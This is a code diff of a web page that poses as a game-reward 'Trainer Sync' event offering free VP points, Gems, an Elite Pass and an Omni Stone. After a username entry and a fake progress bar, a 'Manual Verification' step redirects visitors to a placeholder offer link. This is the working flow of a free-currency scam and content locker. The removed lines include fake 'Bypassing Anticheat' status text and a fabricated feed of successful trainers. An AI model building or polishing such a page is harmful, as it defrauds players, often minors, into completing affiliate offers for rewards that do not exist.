@@ -24,10 +24,9 @@
             padding: 0;
             overflow-x: hidden;
             background: linear-gradient(rgba(2, 5, 10, 0.9), rgba(2, 5, 10, 0.9)), 
-                        url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/Tokyo_Skyline_at_Night_Blue_Hour.jpg/1280px-Tokyo_Skyline_at_Night_Blue_Hour.jpg');
+                        url('https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Statue_of_Liberty%2C_NY.jpg/1280px-Statue_of_Liberty%2C_NY.jpg');
             background-size: cover;
             background-attachment: fixed;
-            background-position: center;
         }
 
         nav {
@@ -90,7 +89,6 @@
             margin-bottom: 15px;
             box-sizing: border-box;
             outline: none;
-            transition: 0.3s;
         }
 
         .grid-rewards {
@@ -114,12 +112,12 @@
 
         .reward-card.active { border-color: var(--primary); background: rgba(0, 242, 255, 0.1); }
 
-        .reward-card img { 
-            width: 55px; 
-            height: 55px;
-            object-fit: contain;
-            margin-bottom: 10px; 
-            filter: drop-shadow(0 0 8px rgba(255,255,255,0.2));
+        /* Icon Emoji Style */
+        .reward-icon { 
+            font-size: 50px; 
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 10px rgba(255,255,255,0.2));
+            line-height: 1;
         }
 
         .reward-card span { display: block; font-weight: 900; font-size: 1.1rem; }
@@ -155,7 +153,6 @@
             border-radius: 50px;
             font-size: 0.8rem;
             color: #00f2ff;
-            border: 1px solid rgba(0,242,255,0.1);
         }
     </style>
 </head>
@@ -174,35 +171,34 @@
         
         <div id="ui-step1">
             <h2 style="margin-top: 40px; color: var(--primary);">Trainer Sync</h2>
-            <p style="color:#aaa; font-size: 0.8rem; margin-bottom: 20px;">April 2026 Distribution Event</p>
             <input type="text" class="input-ui" id="trainer-name" placeholder="Enter Username...">
             <select class="input-ui">
                 <option>Platform: iOS / Android</option>
                 <option>Platform: Nintendo Switch</option>
             </select>
-            <button class="btn-action" onclick="toStep2()">Connect</button>
+            <button class="btn-action" onclick="toStep2()">Continue</button>
         </div>
 
         <div id="ui-step2" class="hidden">
             <h3 style="margin-bottom: 20px; font-size: 0.9rem;">Select Distribution Pack</h3>
             <div class="grid-rewards">
                 <div class="reward-card active" onclick="selectReward(this, '50,000 VP')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Pok%C3%A9_Ball_icon.svg">
+                    <div class="reward-icon">🔴</div>
                     <span>50,000</span>
                     <small>VP Points</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, '10,000 Gems')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Diamond_icon_flat.svg">
+                    <div class="reward-icon">💎</div>
                     <span>10,000</span>
                     <small>Gems</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, 'Elite Pass')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/Ticket_font_awesome_blue.svg" style="filter: hue-rotate(140deg) brightness(1.2);">
+                    <div class="reward-icon">🎫</div>
                     <span>S12</span>
                     <small>Elite Pass</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, 'Omni Stone')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Five_pointed_star.svg" style="filter: drop-shadow(0 0 5px #ffcc00);">
+                    <div class="reward-icon">⭐</div>
                     <span>OMNI</span>
                     <small>Stone</small>
                 </div>
@@ -212,21 +208,18 @@
 
         <div id="ui-sync" class="hidden" style="padding: 40px 0;">
             <div class="loader"></div>
-            <h4 id="status-text" style="color: var(--primary); font-family: 'Orbitron';">Connecting...</h4>
+            <h4 id="status-text" style="color: var(--primary);">Handshaking...</h4>
             <div style="width: 100%; background: #111; height: 8px; border-radius: 10px; overflow: hidden; margin-top: 20px;">
                 <div id="progress-bar" style="width: 0%; height: 100%; background: var(--primary); transition: 0.3s;"></div>
             </div>
         </div>
 
         <div id="ui-locker" class="hidden">
-            <h3 style="color: var(--accent);">Sync Paused</h3>
-            <p style="font-size: 0.85rem; color: #ccc;">Finalize sync for: <span id="summary-res" style="color: var(--primary); font-weight:bold;">...</span></p>
+            <h3 style="color: var(--accent);">Manual Verification</h3>
+            <p style="font-size: 0.85rem; color: #ccc;">Sync for: <span id="summary-res" style="color: var(--primary); font-weight:bold;">...</span></p>
             <div style="background: rgba(0, 242, 255, 0.05); padding: 25px; border: 2px dashed var(--primary); border-radius: 20px; margin: 20px 0;">
-                <i class="fas fa-user-shield" style="font-size: 2rem; color: var(--primary); margin-bottom: 10px;"></i>
-                <p style="font-size: 0.8rem; font-weight: 800;">Human Verification Required</p>
-                <button class="btn-action" style="margin-top:15px; background: var(--accent); color:#fff;" onclick="window.location.href='YOUR_OFFER_LINK_HERE'">Verify Now</button>
+                <button class="btn-action" style="margin:0; background: var(--accent); color:#fff;" onclick="window.location.href='YOUR_OFFER_LINK_HERE'">Verify Now</button>
             </div>
-            <div style="font-size: 0.7rem; color: var(--gold);"><i class="fas fa-lock"></i> SECURE SSL CONNECTION</div>
         </div>
 
         <div class="activity-feed">
@@ -239,8 +232,7 @@
     let selectedItem = "50,000 VP";
 
     function toStep2() {
-        const name = document.getElementById('trainer-name').value;
-        if(name.length < 3) return alert('Please enter a valid Username');
+        if(document.getElementById('trainer-name').value.length < 3) return alert('Enter Username');
         document.getElementById('ui-step1').classList.add('hidden');
         document.getElementById('ui-step2').classList.remove('hidden');
     }
@@ -255,31 +247,17 @@
         document.getElementById('ui-step2').classList.add('hidden');
         document.getElementById('ui-sync').classList.remove('hidden');
         document.getElementById('summary-res').innerText = selectedItem;
-        
         let progress = 0;
-        const steps = ['Authenticating...', 'Finding UID...', 'Injecting Packets...', 'Bypassing Anticheat...', 'Ready!'];
-        
         const interval = setInterval(() => {
-            progress += 4;
+            progress += 5;
             document.getElementById('progress-bar').style.width = progress + '%';
-            document.getElementById('status-text').innerText = steps[Math.floor(progress/21)] || 'Finalizing...';
-            
             if(progress >= 100) {
                 clearInterval(interval);
-                setTimeout(() => {
-                    document.getElementById('ui-sync').classList.add('hidden');
-                    document.getElementById('ui-locker').classList.remove('hidden');
-                }, 500);
+                document.getElementById('ui-sync').classList.add('hidden');
+                document.getElementById('ui-locker').classList.remove('hidden');
             }
-        }, 120);
+        }, 150);
     }
-
-    const trainers = ['X_Slayer_26', 'PokeGod_USA', 'Sara_Elite', 'Daniel_Pro', 'Volt_King'];
-    setInterval(() => {
-        const t = trainers[Math.floor(Math.random()*trainers.length)];
-        const r = ['50,000 VP', '10,000 Gems', 'Elite Pass', 'Omni Stone'][Math.floor(Math.random()*4)];
-        document.getElementById('live-text').innerText = `Trainer \`${t}\` successfully synced ${r}!`;
-    }, 4000);
 </script>
 
 </body>
